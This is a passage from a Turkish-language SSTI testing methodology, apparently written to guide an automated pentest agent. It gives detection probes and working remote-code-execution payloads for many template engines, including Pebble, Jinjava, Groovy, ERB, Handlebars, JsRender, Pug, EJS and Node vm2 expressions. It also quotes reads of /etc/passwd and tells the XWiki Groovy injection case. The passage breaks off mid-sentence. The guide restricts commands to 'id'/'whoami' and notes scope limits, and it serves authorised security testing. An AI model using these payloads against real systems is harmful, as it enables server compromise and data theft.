  __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
  __${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
  ```
  Bu teknik, uygulamanın kullanıcı girdisini bir Spring view adı olarak
  kullandığı (ve view resolver'ın bunu bir Thymeleaf/SpEL ifadesi
  olarak işlediği) durumlarda geçerlidir — bkz. §3 Source→Sink,
  burada "sink" bir view-name resolution mekanizmasıdır.

#### Pebble (Java — Twig'e benzer sözdizimi olan Java engine)

- **Delimiter:** `{{ }}`, `{% %}` (Twig'e çok benzer).
- **Generic detection:** `{{6666*6666}}` → `44435556`;
  `{{44444444-8888}}` → `44435556` (aynı hedef değer, çıkarma probu);
  `{{ someString.toUPPERCASE() }}` gibi metod çağrıları çalışıyorsa
  bu bir Medium indicator'dır.
- **RCE / confirmation — sürüme göre iki farklı teknik:**
  Eski sürümler (< 3.0.9):
  ```
  {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
  ```
  Yeni sürümler (reflection zincirinin farklılaştığı, sandbox'ın
  sıkılaştığı sürümler):
  ```
  {% set cmd = 'id' %}
  {% set bytes = (1).TYPE
       .forName('java.lang.Runtime')
       .methods[6]
       .invoke(null,null)
       .exec(cmd)
       .inputStream
       .readAllBytes() %}
  {{ (1).TYPE
       .forName('java.lang.String')
       .constructors[0]
       .newInstance(([bytes]).toArray()) }}
  ```
- **Jinja-family ile fingerprint çakışması:** `{{ }}` ortak olduğundan
  ayrım için Java'ya özgü hata mesajlarına bak
  (`com.mitchellbosecke.pebble` veya `io.pebbletemplates` — Strong
  indicator).

#### Jinjava (Java — HubSpot'un açık kaynak Jinja benzeri motoru)

- **Generic detection:**
  - `{{ request }}` → bir context objesi döndürür
    (`com.hubspot.[...].context.TemplateContextRequest@...` gibi) —
    bu **Strong/Medium indicator**'dır, Jinjava/HuBL'a özgü bir sınıf
    adı içerdiği için diğer Java-family motorlardan (Freemarker,
    Velocity, Thymeleaf) net ayrım sağlar; her hedefte önce bu denenmeli.
  - `{{'a'.toUpperCase()}}` → `'A'` — bu yalnızca **Weak indicator**'dır;
    herhangi bir Java string metod erişimine izin veren motorda
    (yalnızca Jinjava'ya özgü değil) çalışabilir, tek başına engine
    attribution için kullanılmamalı, yalnızca "obje/method erişimi
    açık" sinyali olarak değerlidir.
- **RCE / confirmation (ScriptEngineManager üzerinden JavaScript
  motoruna erişim — eski sürümlerde çalışır, `HubSpot/jinjava#230` ile
  düzeltilmiştir, version-dependent):**
  ```
  {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}
  ```
  Çıktıyı okumak için `org.apache.commons.io.IOUtils.toString(...)` ile
  process'in InputStream'i string'e çevrilebilir.

#### HuBL (HubSpot — Jinjava tabanlı, "Hubspot Language")

- **Delimiter:** `{% %}` statement, `{{ }}` expression, `{# #}` yorum.
- **Fingerprint:** `{{ request }}` çıktısında
  `com.hubspot.content.hubl.context.TemplateContextRequest` görülmesi
  Strong indicator'dır.
- **RCE / confirmation zinciri (obje oluşturma + interpreter üzerinden
  render):**
  ```
  {% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
  {{ji.render('{{6666*6666}}')}}
  ```
  Bu, "bir template motorunun içinden yeni bir template motoru instance'ı
  oluşturup onu da render ettirme" tekniğidir — nested template
  context'in (bkz. §6) saldırı amaçlı kullanımına iyi bir örnektir.
  Komut çalıştırma için Jinjava'daki `ScriptEngineManager` tekniği
  aynen uygulanabilir.

#### Groovy (Java — bazı Java uygulamaları, XWiki gibi wiki motorları)

- **RCE / confirmation (Security Manager bypass, AST transformation
  üzerinden):**
  ```groovy
  @groovy.transform.ASTTest(value={
      cmd = "id"
      out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
      assert out
  })
  def x
  ```
  `String.execute()` metodu da doğrudan komut çalıştırmak için
  kullanılabilir: `"id".execute().text`. **Dikkat:** `execute()`
  komutu `execve()` ile doğrudan çalıştırır, bu nedenle `|`, `>`, `&`
  gibi shell metakarakterleri yorumlanmaz — çok adımlı bir işlem
  gerekiyorsa (örn. dosya indirip çalıştırma) ayrı `execute()`
  çağrıları zincirlenmelidir, ama bu **kalıcı dosya bırakma**
  içeriyorsa §0.2 Etik / Güvenlik Sınırı'daki kurallara tabidir.

- **Gerçek dünya vaka analizi — XWiki `SolrSearch` Groovy RCE
  (spesifik CVE/sürüm numarası kasıtlı olarak verilmemiştir — bkz.
  §15 Referans Araçlar'daki CVE/versiyon iddiaları notu; güncel sürüm
  aralığı için resmi XWiki advisory'sine bakın):** Belirli bir eski
  XWiki sürüm aralığında, kimlik doğrulaması gerektirmeyen bir RSS
  arama feed'inde `Main.SolrSearch` makrosu üzerinden `text` query
  parametresini alıp wiki syntax'ının içine gömüyor ve makroları
  evaluate ediyordu. Bu,
  `}}}` ile mevcut bloğu kapatıp ardından `{{groovy}}...{{/groovy}}`
  enjekte ederek JVM içinde keyfi Groovy kodu çalıştırılmasına izin
  veriyordu. Bu vakadan çıkarılacak metodolojik dersler:
  1. **Fingerprint + scope daraltma:** Host-based routing arkasındaki
     bir uygulamada `Host` header'ı fuzz edilerek doğru vhost/hedef
     bulunabilir; footer/versiyon bilgisi (`XWiki Debian 15.10.8` gibi)
     hedefin zafiyetli sürüm aralığında olup olmadığını doğrular.
  2. **Encoding dikkat noktası:** Payload'daki tüm karakterler
     (özellikle boşluklar) `%20` olarak URL-encode edilmelidir; `+`
     kullanmak bazı wiki motorlarında farklı bir parse hatasına
     (HTTP 500) yol açabilir — bu, §8.1'deki "encoding katmanlarını
     dikkatli yönet" prensibinin somut bir örneğidir.
  3. **Komut çalıştırma:** `println("id".execute().text)` gibi bir
     Groovy body'si, komut çıktısını doğrudan RSS `<title>` alanında
     (yani ana HTML response'un dışında farklı bir formatta) görünür
     kılar — bu, §9.1'deki "sink her zaman ana response değildir"
     prensibinin somut örneğidir.
  4. **Post-exploitation sınırı:** Bu tür bir zafiyette, örneğin
     konfigürasyon dosyalarında (`hibernate.cfg.xml` gibi) database
     credential'larının bulunması mümkündür — bunları okumak (bilgi
     toplama, side-effect-free) impact'i göstermek için kullanılabilir,
     ama bu credential'ları **kullanarak** başka sistemlere (SSH vb.)
     erişmek scope/yetki sınırlarını aşabilir; bu adıma geçmeden önce
     program kurallarını kontrol et.

#### HTL / Sightly (Java — Adobe Experience Manager, AEM 6.1+)

HTL (HTML Template Language, eski adıyla Sightly), AEM'in **modern
varsayılan** server-side template sistemidir (eski AEM projelerinde
hâlâ JSP bulunabilir — hangisinin kullanıcı girdisini işlediği ayrı
doğrulanmalı, bkz. §13 CMS tablosu). HTL, **kasıtlı olarak Liquid'e
benzer şekilde kısıtlı** tasarlanmıştır — ham `${...}` expression'ları
içinde keyfi metod çağrısı/kod çalıştırma **yoktur**; bu yüzden
klasik "arithmetic → gadget zinciri → RCE" modeli burada genelde
**geçerli değildir**.

- **Delimiter:** `${ }` expression (yalnızca HTML attribute'ları veya
  metin içeriği içinde), `data-sly-*` blok statement'ları (`data-sly-
  if`, `data-sly-test`, `data-sly-use`, `data-sly-template`,
  `data-sly-call`, `data-sly-resource` vb.).
- **Generic detection:** `{{6666*6666}}` çalışmaz (delimiter yanlış —
  negative indicator). `${6666*6666}` da genelde **çalışmaz** çünkü HTL
  expression dili aritmetik operatörleri Jinja2 tarzında desteklemez;
  bu da bir **negative indicator**'dır — "SSTI yok" değil, "bu motorun
  expression dili kasıtlı olarak kısıtlı" anlamına gelir (bkz. §7
  Negative Capability Matrix ilkesi).
- **Gerçek risk yüzeyi — `data-sly-use` üzerinden sınıf adı enjeksiyonu
  (dokümante edilmiş bir HTL kullanım paterni, saldırı yüzeyi olarak
  değerlendirilmeli):** `data-sly-use.model="${'com.example.SomeClass'}"`
  şeklindeki bir kullanım, belirtilen Java sınıfını (bir "Sling
  Model"/"Use-API" sınıfı) örnekleyip template'e bir obje olarak
  expose eder. **Eğer bu sınıf adı (string) kullanıcı girdisinden
  geliyorsa** (application-specific bir yanlış konfigürasyon —
  standart kullanımda sınıf adı developer tarafından sabit yazılır),
  bu, saldırganın **classpath'teki herhangi bir sınıfı** (özellikle
  yan etkisi olan bir constructor'a sahip olanları) örneklemesine izin
  verebilir. Bu, klasik "expression evaluation SSTI"'sinden farklı bir
  zafiyet sınıfıdır — §14.1'deki `vulnerability_class` alanında
  `OBJECT_PROPERTY_ACCESS` veya `EXPRESSION_INJECTION` olarak
  etiketlenmesi, ham "SSTI" etiketinden daha doğru olabilir; kesin
  sınıf, hangi obje/metodun expose edildiğine bağlıdır.
- **Sandbox/tasarım notu:** HTL'nin güvenlik modeli "sandbox'ı aşma"
  değil, "expression dili baştan yeterince kısıtlı" felsefesine
  dayanır — Liquid ile aynı kategoridedir (bkz. §12.3 Liquid). Bu
  yüzden bir hedefte "HTL confirmed ama arithmetic/generic gadget
  bulunamadı" sonucu **beklenen ve yaygın** bir rapor şeklidir; asıl
  aranması gereken application-specific `data-sly-use`/Sling Model
  yanlış konfigürasyonlarıdır, jenerik bir RCE payload'ı değil.
- **Kapsam dışı bırakma notu:** Bu profil, HTL'nin genel injection
  yüzeyini özetler; spesifik doğrulanmış RCE payload'ları burada
  **kasıtlı olarak verilmemiştir** çünkü etki tamamen hangi Use-API
  sınıflarının expose edildiğine bağlıdır — application-specific
  araştırma (kaynak kod erişimi veya davranışsal keşif) burada P4
  (object/helper discovery) aşamasının merkezi kısmıdır.

### 12.3 PHP Ek Motorlar, Ruby ve Node.js Ailesi

#### Plates (PHP) — Genelde SSTI'ye Kapalı, Ayrım İçin Önemli

- **Technology fingerprint:** Twig'den ilham alan ama native PHP kodu
  kullanan bir PHP template motoru.
- **Önemli not:** Plates, template içine **native PHP** kodu yazmaya
  izin verir (`<?php ... ?>`) ama bu genelde geliştiricinin kendi
  yazdığı template dosyalarında olur, kullanıcı girdisi doğrudan bir
  Plates template'i olarak derlenmez (yaygın kullanım paterninde).
  Bu motorda SSTI aramak için önce §3 Source→Sink testini uygula —
  kullanıcı girdisinin gerçekten `$templates->render(...)` çağrısına
  bir template **kaynağı** olarak (değişken değeri değil) ulaştığını
  doğrulamadan "SSTI yok" sonucuna varma, ama aynı zamanda her PHP
  değişken kullanımını da SSTI sanma.

#### PHPlib / HTML_Template_PHPLIB (PHP)

- **Technology fingerprint:** Eski PHP projeleri, `.tpl` dosyalarında
  `{DEĞIŞKEN_ADI}` şeklinde basit placeholder sözdizimi kullanır.
- **Önemli not:** Bu motor "logic-less" bir placeholder sistemidir —
  expression evaluation desteklemez, yalnızca `setVar()` ile atanan
  değerlerin yerine konmasını yapar. SSTI riski pratikte yok denecek
  kadar düşüktür; bu motoru tespit ettiğinde generic aritmetik
  probe'ların **negatif** dönmesi beklenen/normal bir sonuçtur.

#### patTemplate (PHP)

- **Technology fingerprint:** XML tag'leri kullanarak dökümanı
  bölümlere ayıran, derlenmeyen (non-compiling) bir PHP template
  motoru (`<patTemplate:tmpl name="...">` sözdizimi).
- **Önemli not:** PHPlib gibi, expression evaluation desteklemeyen bir
  yapısal şablon sistemidir — SSTI riski düşüktür, ama template
  yapısının kendisi (tag isimleri) kullanıcı girdisinden türetiliyorsa
  farklı bir enjeksiyon riski (template yapı manipülasyonu) söz
  konusu olabilir; bu durum klasik SSTI'den ayrı değerlendirilmelidir.

#### ERB (Ruby — Rails)

- **Delimiter:** `<%= %>` (çıktı üretir), `<% %>` (yalnızca çalıştırır).
- **Generic detection:** `<%= 6666*6666 %>` → `44435556`;
  `<%= 44444444-8888 %>` → `44435556` (aynı hedef değer, çıkarma probu);
  `<%= foobar %>` → hata (tanımsız değişken).
- **RCE / confirmation:**
  ```
  <%= system("id") %>
  <%= `id` %>
  <%= Dir.entries('/') %>            # dizin listeleme
  <%= File.open('/etc/passwd').read %> # dosya okuma
  <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('id') %><%= @b.readline() %>
  ```
- **Sandbox:** Default: yok.
- **Application-specific kaynak:** Genelde geliştirici hatası ile
  `render inline: user_input` kullanımı (bkz. §4 Sink Discovery).

#### Slim (Ruby)

- **Generic detection:** `{ 6666 * 6666 }` → `44435556`.
- **RCE / confirmation:** `{ %x|id| }` (Ruby'nin `%x` backtick-benzeri
  komut çalıştırma sözdizimi).

#### Liquid (Ruby — Shopify, Jekyll ve türevleri)

Liquid, tasarım gereği **güvenli/sandbox'lı** bir motordur — üçüncü
taraf tema/tema-geliştiricisi kodunu (Shopify mağaza temaları gibi)
güvenle çalıştırmak için baştan böyle tasarlanmıştır. Bu yüzden
Liquid'de çoğu zaman **doğru sonuç RCE değil, negatif/sandbox-limited**
bir sonuçtur — bu bir test hatası değil, motorun beklenen
davranışıdır.

- **Technology fingerprint:** Shopify mağazaları (`{{ }}`/`{% %}` tema
  dosyalarında), Jekyll (statik site — build-time render, bkz. aşağı),
  ayrıca genel Ruby projelerinde `Liquid::Template.parse` kullanımı.
- **Delimiter:** `{{ }}` ifade, `{% %}` statement (Jinja2/Django'ya
  sözdizimsel olarak yakın, ama **davranışsal olarak çok daha
  kısıtlı**).
- **Generic detection:**
  - `{{ 6666 | times: 6666 }}` → `44435556` (Liquid'de aritmetik yalnızca
    filtre üzerinden yapılır, Jinja2'nin aksine `{{6666*6666}}` **çalışmaz**
    — bu negative sonuç Liquid'e işaret eden bir fingerprint sinyalidir).
  - `{{ "a" | append: "b" }}` → `ab` (string filtre zinciri çalıştığını
    doğrular).
  - Tanımsız değişken `{{ some_undefined_var_AAA1234 }}` → sessizce boş
    string (Django Templates ile aynı davranış — Jinja2'den ayıran bir
    nokta).
- **Sandbox modeli (kritik):** Liquid, **whitelist tabanlı** bir
  obje/metod erişim modeli kullanır — yalnızca `Drop` sınıfları
  üzerinden açıkça expose edilen property'lere erişilebilir; ham
  Ruby objelerine (`self`, `class`, `instance_eval` zincirleri) **erişim
  yoktur**. Bu, Jinja2/Twig'deki `__class__`/`__globals__` tipi
  gadget zincirlerinin **çalışmadığı** anlamına gelir.
- **Shopify Liquid vs generic Liquid ayrımı:** Shopify, standart
  Liquid'e ek olarak kendi (daha da kısıtlı, kendi whitelist'ine sahip)
  obje kümesini (`product`, `shop`, `customer` gibi Shopify-özel
  Drop'lar) sunar; generic (gem olarak kullanılan) Liquid'de bu objeler
  yoktur ama uygulamanın kendi tanımladığı Drop'lar olabilir. Her iki
  durumda da **hangi Drop'ların expose edildiğini** haritalamak (§4
  Sink Discovery), gerçek etkiyi belirleyen asıl adımdır.
- **Jekyll ayrımı:** Jekyll'de Liquid, **build-time**'da (statik site
  üretimi sırasında, CI/CD içinde) çalışır — kullanıcı girdisi
  (örneğin bir GitHub Pages reposuna PR ile gönderilen içerik) ancak
  **build tetiklendiğinde** işlenir. Burada "SSTI" aslında bir
  **CI/CD pipeline'ında kod çalıştırma** zafiyetine denk gelir; klasik
  reflected/anlık test modeli burada geçerli değildir, doğrulama için
  build log'larına veya build çıktısına bakmak gerekir.
- **Information disclosure / object access sınırları:** Sandbox
  nedeniyle Liquid'de RCE'ye ulaşmak nadirdir; asıl aranması gereken
  şey genelde **expose edilen Drop objelerinin üzerinden aşırı bilgi
  sızıntısı** olur (örn. bir Drop yanlışlıkla hassas bir alanı da
  expose ediyorsa). Bu yüzden Liquid'de "confirmed SSTI ama sandbox
  RCE'yi engelliyor" sonucu **beklenen ve yaygın** bir rapor
  şeklidir — bunu "zafiyet yok" ile karıştırma.
- **.NET portu için bkz.** §12.4 DotLiquid/Scriban — orada "Ruby
  Liquid ile aynı mantık" ifadesi bu bölüme referanstır.

#### Mojolicious (Perl)

- **Technology fingerprint:** Perl Mojolicious framework.
- **Syntax:** ERB'ye benzer tag'ler kullanır.
- **Generic detection:** `<%= 6666*6666 %>` → `44435556`;
  `<%= 44444444-8888 %>` → `44435556` (aynı hedef değer, çıkarma probu);
  `<%= foobar %>` → hata.
- **RCE / confirmation:** `<%= `id` %>` veya `<% system("id") %>`
  benzeri doğrudan Perl kodu çalıştırma (sandbox'sız).

#### Handlebars (Node.js / çok dilli)

- **Delimiter:** `{{ }}`.
- **"Logic-less" tasarım:** `{{6666*6666}}` **çalışmaz** — bu negative
  indicator, Handlebars/Mustache ailesine işaret eder.
- **Helper Discovery — RCE zincirine atlamadan önce (P3/P4):**
  Karmaşık `constructor`-zinciri RCE denemesine geçmeden önce, hangi
  built-in ve custom helper'ların mevcut olduğunu haritalamak hem daha
  az riskli hem de agent'a hangi zincirin işe yarayabileceği hakkında
  bilgi verir:
  ```
  {{#if true}}A{{else}}B{{/if}}      → built-in #if çalışıyor mu?
  {{#each someArray}}{{this}}{{/each}} → built-in #each çalışıyor mu?
  {{#with someObj}}{{this}}{{/with}}   → built-in #with çalışıyor mu?
  {{lookup someObj "key"}}             → built-in lookup çalışıyor mu?
  ```
  Bu dördü çalışıyorsa (vanilla Handlebars, Mustache değil — bkz.
  aşağıdaki ayrım notu), **custom/CMS-özel helper** olup olmadığını
  araştır: uygulamanın/CMS'in dokümantasyonunda veya kaynak kodunda
  (erişilebiliyorsa) listelenen helper adlarını tek tek dene (örn.
  `{{helperAdıDenemesi}}` → tanımsızsa sessizce boş döner, tanımlıysa
  bir çıktı üretir). **CMS-aware örnek (doğrulanmış — Ghost CMS):**
  Ghost temaları resmi olarak `{{@site}}`, `{{@config}}`, `{{@custom}}`
  gibi context data helper'larını expose eder (§13 CMS tablosu); hedef
  Ghost ise bu üçü doğrudan dene — CMS'e özgü context objelerini
  keşfetmek, generic `{{this}}` denemekten çok daha hızlı bir bilgi
  sızıntısı/fingerprint sinyali verir. Diğer Handlebars tabanlı
  CMS'lerde de benzer bir "belgelenmiş data helper'ları dene" adımı
  uygulanmalı.
  ```
  Handlebars tespit edildi (negative arithmetic + {{ }} reflect)
    ↓
  built-in helper'lar (#if/#each/#with/lookup) çalışıyor mu?
    ├─ hayır → muhtemelen saf Mustache, bkz. aşağıdaki ayrım notu
    └─ evet → CMS/uygulama biliniyor mu?
                ├─ evet → o CMS'in belgelenmiş data helper'larını dene
                │         (örn. Ghost: @site/@config/@custom)
                └─ hayır → generic helper-chain RCE'ye geç (aşağıda)
  ```
- **Path Traversal / RCE (prototype pollution zinciri üzerinden,
  Handlebars'ın kendi sandbox'ını atlatan bilinen bir teknik):**
  ```
  {{#with "s" as |string|}}
    {{#with "e"}}
      {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
          {{this.pop}}
          {{this.push "return require('child_process').execSync('id').toString();"}}
          {{this.pop}}
          {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
              {{this}}
            {{/with}}
          {{/each}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
  ```
  Bu payload karmaşık görünse de mantığı basittir: Handlebars'ın
  `lookup`/`with`/`each` helper'larını zincirleyerek JavaScript'in
  `String.prototype` üzerinden `constructor` zincirine (yani
  `Function` constructor'ına) ulaşmak ve bu şekilde native kod
  çalıştırmaktır. Bu, "logic-less" bir motorun bile helper
  zincirleme yoluyla RCE'ye açık olabileceğinin klasik bir örneğidir
  (bkz. §10 Confirmation'daki değerlendirme: bu motorda pozitif sonuç
  aritmetik probe ile değil, bu tür helper-zincirleme testleriyle
  aranmalıdır). *(Metadata: payload_stage=P6, prerequisites: built-in
  #with/#each/lookup çalışıyor + sandbox/CSP kısıtlaması yok,
  side_effect_level: read-only — `execSync('id').toString()` yalnızca
  komut çıktısını okur, sistemde herhangi bir değişiklik yapmaz; yine
  de §0.2 etik sınırına tabidir, `id`/`whoami` dışına çıkılmaz.)*

#### Mustache — Handlebars'tan Ayrım

Mustache, Handlebars'ın **atası** ve daha da kısıtlı halidir —
Handlebars, Mustache sözdizimine `{{#with}}`, `{{#each}}`, `{{lookup}}`
gibi **helper'lar** ekleyerek genişletir; saf (vanilla) Mustache'de bu
helper'lar **yoktur**. Bu fark, iki motoru ayırt etmenin ve gerçek
riski değerlendirmenin anahtarıdır:

- **Ortak negative indicator:** İkisinde de `{{6666*6666}}` çalışmaz
  (her ikisi de "logic-less" ailededir).
- **Ayrım testi:** Yukarıdaki §12.3 Handlebars bölümündeki
  `{{#with}}`/`{{lookup}}` zincirini dene:
  - **Çalışıyorsa** → Handlebars (veya Handlebars-uyumlu bir motor) —
    helper-chain RCE potansiyeli var, o bölümdeki payload'ı kullan.
  - **Hata veriyorsa/çalışmıyorsa** → muhtemelen saf Mustache. Bu
    durumda **native code execution (RCE) yolu genel olarak yoktur**
    (helper sistemi olmadığı için gadget zinciri kurulacak bir yüzey
    yok) — ama bu, "SSTI etkisi tamamen yoktur" anlamına gelmez. SSTI
    ≠ RCE: aranması gereken risk türü konteks/context'e bağlı olarak
    değişir — `{{#section}}...{{/section}}` bloklarının hangi objeleri
    iterate ettiği üzerinden **yetkisiz veri sızıntısı** (application-
    specific bir objenin beklenmedik alanlarının render edilmesi),
    recursive partial/include kullanımıyla **kaynak tüketimi**, veya
    uygulamaya özel bir helper/extension kayıtlıysa o helper üzerinden
    dolaylı bir yüzey mümkün olabilir (bkz. §6 Type Confusion). Yani:
    **native code execution capability: genel olarak yok; SSTI impact:
    application/context'e bağlı olarak hâlâ değerlendirilmeli.**
- **Django/Liquid ile karışma riski:** Mustache/Handlebars'ın
  `{{değişken}}` ve `{{#section}}...{{/section}}` sözdizimi, Django
  Templates'in `{{değişken}}`/`{% for %}` ve Liquid'in
  `{{değişken}}`/`{% for %}` sözdizimiyle yüzeysel olarak benzer
  görünebilir. Ayrım noktası: Django/Liquid'de statement'lar **`{% %}`**
  içinde, Mustache/Handlebars'ta ise **`{{# %}}...{{/ %}}`** (aynı
  çift-süslü delimiter) içinde yazılır — bir "for-each" denemesinde
  hangi sözdiziminin kabul edildiği tek başına güçlü bir fingerprint
  sinyalidir.

#### JsRender (Node.js)

- **Generic detection:** `{{: 6666*6666}}` → `44435556` (JsRender'ın
  `{{: }}` "evaluate and render" sözdizimi); `{{: 44444444-8888}}` →
  `44435556` (aynı hedef değer, çıkarma probu).
- **RCE / confirmation (sunucu tarafı):**
  ```
  {{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('id').toString()")()}}
  ```
  *(Metadata — §14.2: payload_stage=P6, prerequisites:
  `evaluation=confirmed`, `engine=JsRender`, `node_runtime=true`,
  `commonjs_entrypoint=true` (`process.mainModule` deprecated ve
  yalnızca CommonJS giriş noktalarında doludur — ESM tabanlı modern
  Node uygulamalarında `undefined` olabilir, bu durumda payload
  başarısız olur, "SSTI yok" anlamına gelmez), `sandbox=absent` (default); side_effect_level=read-only — yine de
  §0.2 etik sınırına tabidir, `id`/`whoami` dışına çıkılmaz.)*
  Bu, `toString.constructor` zincirlemesiyle `Function` constructor'ına
  ulaşıp Node.js'in internal module loader'ı üzerinden `child_process`
  yüklemenin bir başka varyantıdır.

#### PugJs / Jade (Node.js)

- **Generic detection:** `#{6666*6666}` → `44435556`;
  `#{44444444-8888}` → `44435556` (aynı hedef değer, çıkarma probu).
- **RCE / confirmation:**
  ```
  #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('id').toString()}()}
  ```
  *(Metadata — §14.2: payload_stage=P6, prerequisites:
  `evaluation=confirmed`, `engine=PugJs`, `node_runtime=true`,
  `commonjs_entrypoint=true` (`process.mainModule` deprecated ve
  yalnızca CommonJS giriş noktalarında doludur — ESM tabanlı modern
  Node uygulamalarında `undefined` olabilir, bu durumda payload
  başarısız olur, "SSTI yok" anlamına gelmez), `sandbox=absent` (default); side_effect_level=read-only — yine de
  §0.2 etik sınırına tabidir, `id`/`whoami` dışına çıkılmaz.)*
  Jade (Pug'un eski adı) için benzer bir teknik:
  ```
  - var x = root.process
  - x = x.mainModule.require
  - x = x('child_process')
  = x.execSync('id').toString()
  ```

#### EJS (Node.js — Express'in varsayılan view engine'lerinden biri)

EJS, Node.js ekosisteminde çok yaygın olmasına rağmen Nunjucks/
Handlebars/JsRender/Pug'dan **tamamen farklı bir sözdizimi ailesine**
(ERB'ye benzer `<% %>`) sahiptir — bu yüzden ayrı bir fingerprint
hedefi olarak ele alınmalıdır; Jinja-tarzı `{{ }}` probe'ları EJS'de
anlamsızdır.

- **Technology fingerprint:** Express.js (`view engine` olarak `ejs`
  ayarlanmış), bazı legacy Node.js MVC uygulamaları.
- **Delimiter:** `<%= %>` (HTML-escape'li çıktı), `<%- %>` (raw/escape
  edilmemiş çıktı), `<% %>` (yalnızca çalıştırır, çıktı üretmez),
  `<%# %>` (yorum).
- **Generic detection:**
  - `<%= 6666*6666 %>` → `44435556`
  - `<%= 44444444-8888 %>` → `44435556` (aynı hedef değer, çıkarma probu)
  - `<%- 6666*6666 %>` → aynı sonuç, ama bu delimiter'ın kabul edilip
    edilmediği (bazı uygulamalarda `<%-` devre dışı bırakılmış olabilir)
    ayrı bir sinyal.
  - `<%= foobar_undefined_AAA1234 %>` → `ReferenceError` (Node.js'in
    kendi hata mesajı, EJS'e özgü değil ama Strong indicator olarak
    kullanılabilir — stack trace'te `ejs` modül adı geçebilir).
- **RCE / confirmation:**
  ```
  <%= global.process.mainModule.require('child_process').execSync('id') %>
  <%- global.process.mainModule.require('child_process').execSync('id').toString() %>
  ```
  *(Metadata — §14.2: payload_stage=P6, prerequisites:
  `evaluation=confirmed`, `engine=EJS`, `node_runtime=true`,
  `commonjs_entrypoint=true` (`process.mainModule` deprecated ve
  yalnızca CommonJS giriş noktalarında doludur — ESM tabanlı modern
  Node uygulamalarında `undefined` olabilir, bu durumda payload
  başarısız olur, "SSTI yok" anlamına gelmez), `sandbox=absent` (default); side_effect_level=read-only — yine de
  §0.2 etik sınırına tabidir, `id`/`whoami` dışına çıkılmaz.)*

  Bazı EJS sürümlerinde/konfigürasyonlarında `require` doğrudan scope'ta
  bulunabilir:
  ```
  <%= require('child_process').execSync('id') %>
  ```
  *(Aynı metadata, ek prerequisite: `require_in_scope=true`.)*
- **Sandbox:** Default: yok — EJS, template'i doğrudan Node.js
  `vm` modülü üzerinden derleyip çalıştırır, Jinja2/Twig tarzı bir
  sandbox extension'ı yoktur. Bazı uygulamalar EJS'i `ejs-locals` gibi
  bir sarmalayıcı ile veya `client: true` (derlenmiş fonksiyon,
  tarayıcı tarafı) modunda kullanabilir — bu modda sink sunucu tarafında
  olmayabilir, önce §3 Source→Sink ile derlemenin gerçekten sunucuda
  olduğunu doğrula.
- **Nunjucks/Handlebars ile ayrım:** `<%= %>` kabul ediliyorsa ve
  `{{ }}` reflect edilip derlenmiyorsa, EJS (veya ERB/Mojolicious gibi
  aynı ailede bir motor) olduğuna işaret eder — bu durumda §12.1/§12.3
  Jinja/Handlebars profillerini değil, bu bölümü ve gerekirse ERB
  bölümünü (yukarıda) karşılaştırmalı incele.

#### Nunjucks — Ek Not

Bkz. §12.1 (Jinja-benzeri aile içinde ele alınmıştır).

#### NodeJS Expression Sandbox'ları (vm2 / isolated-vm) — No-Code/Workflow Builder Bağlamı

Bazı workflow builder'lar (otomasyon araçları), kullanıcı tarafından
yazılan ifadeleri bir Node sandbox'ı (`vm2`, `isolated-vm`) içinde
değerlendirir; ancak expression context'i genelde `this.process.
mainModule.require`'a hâlâ erişim sağlayabilir. Bu, dedike bir
"Execute Command" node'u devre dışı bırakılmış olsa bile
`child_process` modülünün yüklenip komut çalıştırılmasına izin verir:

```javascript
={{ (function() {
  const require = this.process.mainModule.require;
  const execSync = require("child_process").execSync;
  return execSync("id").toString();
})() }}
```

Bu, klasik bir "template engine" olmasa da, kullanıcı ifadelerini
sandbox içinde evaluate eden her sistemde aranması gereken bir
pattern'dir — bkz. §11 Modern Mimari Notları.

### 12.4 .NET, ASP, Go ve Ekstra Notlar

#### Razor (.NET — ASP.NET)

- **Delimiter:** `@( )`, `@{ }`.
- **Generic detection:** `@(6666*6666)` → `44435556`;
  `@(44444444-8888)` → `44435556` (aynı hedef değer, çıkarma probu);
  `@()` → boş ama hatasız (Success); `@{}` → hata (ERROR).
- **Önemli not / KRİTİK GATE:** `@(6666*6666)` gibi bir probe'un
  çalışması yalnızca "bu sayfa Razor ile render ediliyor" bilgisini
  doğrular — **kullanıcı girdisinin Razor kaynağına ulaştığının kanıtı
  değildir.** Normal bir ASP.NET Razor view'ında `@(...)` zaten
  developer tarafından yazılmış statik kaynak kodun bir parçasıdır ve
  her istekte olduğu gibi çalışır; bunu görmek SSTI'ye işaret etmez.
  **Razor SSTI adayı yalnızca şu zincir doğrulandığında gerçektir:**
  ```
  kullanıcı girdisi → runtime'da bir Razor KAYNAK STRING'i olarak
  birleştiriliyor → bir Razor compiler'a (RazorLightEngine,
  RazorEngine, veya elle yazılmış bir runtime-compile katmanı)
  veriliyor → derlenip çalıştırılıyor → çıktı response'a yansıyor
  ```
  Bu zincir application-specific'tir ve genelde kaynak koda erişim
  veya davranışsal ipuçları (örn. bir "template" alanına Razor
  sözdizimi yazıldığında derleme hatası dönmesi) ile doğrulanır. Bu
  zincir doğrulanmadan `@(6666*6666)` gibi bir generic probe'un
  başarılı olması **tek başına confirmed SSTI sayılmaz** — olsa olsa
  "bu teknoloji Razor" (engine fingerprint evidence) sayılır, §8.4'e
  göre SSTI classification için ayrıca yukarıdaki zincirin evidence'ı
  gerekir.
- Razor genelde **derleme zamanlı** işlenir; runtime'da kullanıcı
  girdisinin doğrudan bir Razor view'ı olarak compile edilmesi yalnızca
  `RazorLightEngine` gibi runtime-compile kütüphaneleri kullanan
  uygulamalarda mümkündür.
- **RCE / confirmation (yalnızca yukarıdaki runtime-compile senaryosu
